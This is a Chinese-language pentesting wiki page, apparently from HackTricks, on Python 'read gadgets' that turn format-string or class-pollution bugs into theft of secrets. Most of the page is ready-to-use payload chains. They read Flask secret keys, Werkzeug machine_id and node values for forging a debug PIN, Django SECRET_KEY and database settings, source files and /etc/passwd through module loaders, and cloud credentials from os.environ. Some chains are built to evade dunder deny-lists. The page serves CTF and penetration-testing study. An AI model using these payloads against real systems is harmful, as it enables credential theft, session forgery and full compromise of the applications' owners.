# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

不同的漏洞，例如 [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) 或 [**Class Pollution**](class-pollution-pythons-prototype-pollution.md)，可能允许你**读取 Python 内部数据，但无法执行代码**。因此，pentester 需要充分利用这些读取权限，以**获取敏感权限并提升漏洞的影响**。

### Flask - 读取 secret key

Flask 应用的主页很可能包含 **`app`** 全局对象，其中配置了这个 **secret**。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
在这种情况下，只需使用 [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) 中用于 **access global objects** 的任意 gadget，即可访问此对象。

如果 **vulnerability 位于不同的 python file 中**，则需要一个用于遍历文件的 gadget，以到达主文件，从而 **access 全局对象 `app.secret_key`**，并能够在获知该密钥后 [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)。

例如，以下 payload [来自此 writeup](https://ctftime.org/writeup/36082)：<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
使用此 payload 可**读取 `app.secret_key`**。如果原始 bug 还赋予你一个 write primitive（例如 class pollution），则可以使用相同路径替换它，并为权限更高的 Flask cookies 签名。

### Werkzeug - machine_id 和 node uuid

[**使用此 writeup 中的这些 payload**](https://vozec.fr/writeups/tweedle-dum-dee/) 你将能够访问 **machine_id** 和 **uuid** node，它们是你需要的 **private bits**，用于 [**生成 Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md)，并在启用 **debug mode** 时访问 `/console` 中的 python console：<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> 注意，你可以通过在网页中生成一些**错误**来获取 **服务器上 `app.py` 的本地路径**，这些错误会**提供该路径**。

如果漏洞位于不同的 Python 文件中，请检查之前的 Flask 技巧，以访问主 Python 文件中的对象。

### Django - SECRET_KEY 和 settings module

Django settings 对象会在应用启动后缓存到 `sys.modules` 中。仅凭 read primitives，你就可以 leak **`SECRET_KEY`**、备用密钥、数据库凭据或签名 salts：
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
如果易受攻击的 gadget 位于另一个模块中，先遍历 globals：
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` 与当前的 `SECRET_KEY` 同样有价值：在轮换期间，它们仍会验证旧的已签名值。<sup>[[1]](#references)</sup>此外，leak `SESSION_ENGINE` 和 `SESSION_SERIALIZER`，即可快速确定影响仅限于 cookie 伪造，还是更严重。有关 Web 影响的详细信息，请查看 [**Django pentesting 页面**](../../network-services-pentesting/pentesting-web/django.md)。

### Module loader gadgets - 读取源代码和文件

已加载的 Python 模块通常会保留一个 `__loader__`。基于文件的 loader 经常会公开 `get_source()` 和 `get_data()`，当你已经能够访问模块对象但无法使用 `open()` 时，它们是完美的**只读原语**：
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
这对于 dump **config modules、blueprints、helper files 或 hidden routes** 非常有用，可以恢复 API keys、DSNs、flag paths 或其他 gadget entry points。

如果你只能进行 subclass enumeration，请按名称搜索 loader，而不是硬编码索引：
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

如果你能创建或访问一个 generator/coroutine 对象，其 frame 可以在**不需要任何函数 `__globals__` gadget**的情况下泄露 globals。这对于绕过只阻止 dunder 名称、却忽略 `gi_frame`、`ag_frame`、`cr_frame` 或 `f_globals` 等 frame 属性的过滤器非常有用：
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
一旦获取了 frame globals，就像其他 gadgets 一样继续操作（`sys.modules`、settings objects、`os.environ` 等）。近期的 sandbox escapes 一直在重新发现这一点，因为 `gi_frame` 和 `f_globals` 不是 dunder attributes，通常能够绕过简单的 deny-lists。

### 通过已加载的模块获取环境变量 / cloud creds

许多 jail 仍会在某处导入 `os` 或 `sys`。你可以利用任何可访问函数的 `__init__.__globals__`，跳转到已导入的 `os` 模块，并导出包含 API tokens、cloud keys 或 flags 的 **环境变量**：
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
如果 subclass index 被过滤，请使用 loaders：
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
环境变量通常是从 read 迈向完全 compromise 所需的唯一 secrets（cloud IAM keys、database URLs、signing keys 等）。

### Django-Unicorn class pollution（CVE-2025-24370）

`django-unicorn`（[**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)，受影响版本 `<0.61.0`）允许通过构造的 component requests 实现 **class pollution**。例如，`__init__.__globals__` 这样的 property path 可以访问 component module 的 globals 以及已导入的 modules；该 advisory 展示了覆盖 Django 的 `SECRET_KEY` 和 `os.environ` 中的值，而不是只能进行 read-only exploit。<sup>[[5]](#references)</sup> 如果另一个 bug 提供了对同一 object graph 的 read access，那么这些 globals 可能会暴露 configuration 和 credentials，而无需 code execution。

### 用于 chaining 的 Gadget collections

近期的 CTF 和 pyjail research 展示了仅通过 attribute access 和 subclass enumeration 构建可靠 read chains 的方法。社区维护的 lists（例如 [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker)）收录了数百个 minimal gadgets，可以将 objects 逐步遍历到 `__globals__`、`sys.modules`，最终访问 sensitive data。<sup>[[2]](#references)</sup> 优先使用基于 **attribute/name 的 searches**，而不是依赖 raw subclass indexes，因为 `os._wrap_close`、`FileLoader`、`warnings.catch_warnings` 等对象的位置会随 Python 版本以及额外导入的 libraries 而变化。

## References

- [1] [Django cryptographic signing 文档](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass（GHSA-g9wf-5777-gq43）](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
